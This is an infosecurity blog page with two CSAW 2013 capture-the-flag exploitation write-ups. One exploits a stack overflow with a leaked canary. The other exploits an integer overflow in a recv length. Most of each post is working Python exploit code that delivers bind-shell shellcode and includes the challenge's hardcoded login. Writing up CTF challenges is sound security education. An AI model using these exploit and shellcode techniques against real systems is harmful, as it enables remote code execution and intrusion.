
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>ejohn</title>
  <meta name="author" content="ejohn">

  
  <meta name="description" content="Infosecurity blog by ejohn">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://ejohn.github.io">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="ejohn" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-44281103-1']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">ejohn</a></h1>
  
    <h2>ramblings of an aspiring hacker</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:ejohn.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/09/23/csaw-2013-exploitation-200/">CSAW 2013: Exploitation 200</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-09-23T18:28:00-04:00" pubdate data-updated="true">Sep 23<span>rd</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>This level 200 challenge has a very obvious buffer overflow vulnerability but with a little twist, the devious geniuses at ISIS labs implemented their own custom stack canary buffer overflow protection! Well given that it is a 200 level challenge they made things a lot easier by sending us the canary value used and the address of the buffer on the stack. With these two values in hand its a straight forward buffer overflow exploit.</p>

<h3>Exploit</h3>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pack</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">31338</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c">#Receive the address of the buffer on the stack</span>
</span><span class='line'><span class="n">buffer_address</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="n">buffer_address</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">buffer_address</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="c">#Calculate the offset from the start of the buffer to the location of the shellcode.</span>
</span><span class='line'><span class="c">#Padding: 2048, Canary: 4, Padding: 12, EIP: 4, NOP sled + payload</span>
</span><span class='line'><span class="c">#Jump to the middle of the NOP sled</span>
</span><span class='line'><span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="mi">2048</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">shellcode_addr</span> <span class="o">=</span> <span class="n">buffer_address</span> <span class="o">+</span> <span class="n">offset</span>
</span><span class='line'><span class="n">shellcode_addr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c">#Receive the canary.</span>
</span><span class='line'><span class="n">canary</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c">##http://www.shell-storm.org/shellcode/files/shellcode-836.php</span>
</span><span class='line'><span class="c">##Bind shell on port 11111</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span> <span class="s">&quot;</span><span class="se">\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02</span><span class="s">&quot;</span>
</span><span class='line'>          <span class="s">&quot;</span><span class="se">\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68\x2b\x67</span><span class="s">&quot;</span>
</span><span class='line'>          <span class="s">&quot;</span><span class="se">\x6a\x10\x51\x50\xb0\x66\x89\xe1\xcd\x80\x89</span><span class="s">&quot;</span>
</span><span class='line'>          <span class="s">&quot;</span><span class="se">\x51\x04\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43</span><span class="s">&quot;</span>
</span><span class='line'>          <span class="s">&quot;</span><span class="se">\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79</span><span class="s">&quot;</span>
</span><span class='line'>          <span class="s">&quot;</span><span class="se">\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62</span><span class="s">&quot;</span>
</span><span class='line'>          <span class="s">&quot;</span><span class="se">\x69\x6e\x89\xe3\x41\xcd\x80</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">2048</span> <span class="o">+</span> <span class="n">canary</span> <span class="o">+</span> <span class="s">&quot;AAAABBBBCCCC&quot;</span> <span class="o">+</span> <span class="n">shellcode_addr</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">64</span> <span class="o">+</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/09/23/csaw-exploitation-300/">CSAW 2013: Exploitation 300</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-09-23T16:34:00-04:00" pubdate data-updated="true">Sep 23<span>rd</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>The level 300 exploitation challenge involved an integer overflow. I figured out the username and password that were hardcoded in the binary. The program then asks for an integer input and uses that as the number of bytes to read parameter in recv(). The only input validation that is performed on this parameter is to check if it is less than 1024. Classic integer overflow vulnerability! Entering <code>-1</code> here lets us enter as much data we need since it gets interpreted as a positive integer. The next thing to notice is that the stack is executable.</p>

<h3>The plan of action</h3>

<ul>
<li>Find the address of recv function in PLT using <code>objdump -d fil_chal | grep recv</code></li>
<li>Find a writable location in the data or bss section of the binary using <code>readelf -S fil_chal</code></li>
<li>Exploit the integer overflow vulnerability and overflow the stack by sending sufficient padding.</li>
<li>Overflow EIP with the address of the recv function. Setup the stack in such a way that <code>recv(4, addr_in_bss, len(shellcode), 0)</code> is called and after recv returns, execution continues at <code>addr_in_bss</code>. I figured the socket descriptor is 4 using strace and checking the recv call made by the binary.</li>
<li>Once the shellcode is read into memory at the address specified, execution jumps to the shellcode and we have a shell listening at port 31337.</li>
</ul>


<h3>Exploit</h3>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pack</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">tn</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">(</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">34266</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">tn</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;UserName: &#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">tn</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&#39;csaw2013&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">tn</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;Password: &#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">tn</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&#39;S1mplePWD&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">tn</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;Entry Info: &#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">tn</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;-1&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c">##Shellcode to bind /bin/sh on port 31337</span>
</span><span class='line'><span class="c">##http://www.shell-storm.org/shellcode/files/shellcode-847.php</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="s">&quot;</span><span class="se">\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51</span><span class="s">&quot;</span>
</span><span class='line'>          <span class="s">&quot;</span><span class="se">\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0</span><span class="s">&quot;</span>
</span><span class='line'>          <span class="s">&quot;</span><span class="se">\x66\xb3\x02\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a</span><span class="s">&quot;</span>
</span><span class='line'>          <span class="s">&quot;</span><span class="se">\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x01</span><span class="s">&quot;</span>
</span><span class='line'>          <span class="s">&quot;</span><span class="se">\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89</span><span class="s">&quot;</span>
</span><span class='line'>          <span class="s">&quot;</span><span class="se">\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f</span><span class="s">&quot;</span>
</span><span class='line'>          <span class="s">&quot;</span><span class="se">\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68</span><span class="s">&quot;</span>
</span><span class='line'>          <span class="s">&quot;</span><span class="se">\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2</span><span class="s">&quot;</span>
</span><span class='line'>          <span class="s">&quot;</span><span class="se">\xb0\x0b\xcd\x80</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">padding</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">1056</span>
</span><span class='line'><span class="n">recv</span> <span class="o">=</span> <span class="mh">0x08048890</span>
</span><span class='line'><span class="n">bss</span> <span class="o">=</span> <span class="mh">0x0804b008</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="mi">32</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c">##recv(socket_descriptor, addr_in_bss, num_bytes_to_read, flags)</span>
</span><span class='line'><span class="c">##return address after recv = addr_in_bss</span>
</span><span class='line'><span class="n">tn</span><span class="o">.</span><span class="n">write</span><span class="p">(</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">recv</span><span class="p">)</span> <span class="o">+</span>
</span><span class='line'>                  <span class="n">pack</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="o">+</span>
</span><span class='line'>                  <span class="n">pack</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span>
</span><span class='line'>                  <span class="n">pack</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="o">+</span>
</span><span class='line'>                  <span class="n">pack</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span>
</span><span class='line'>                  <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span><span class='line'><span class="n">tn</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">tn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>

</div>
  
  


    </article>
  
  <div class="pagination">
    
    <a href="/blog/archives">Blog Archives</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2013/09/23/csaw-2013-exploitation-200/">CSAW 2013: Exploitation 200</a>
      </li>
    
      <li class="post">
        <a href="/blog/2013/09/23/csaw-exploitation-300/">CSAW 2013: Exploitation 300</a>
      </li>
    
  </ul>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2013 - ejohn -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'ejohnghb';
      
        
        var disqus_script = 'count.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
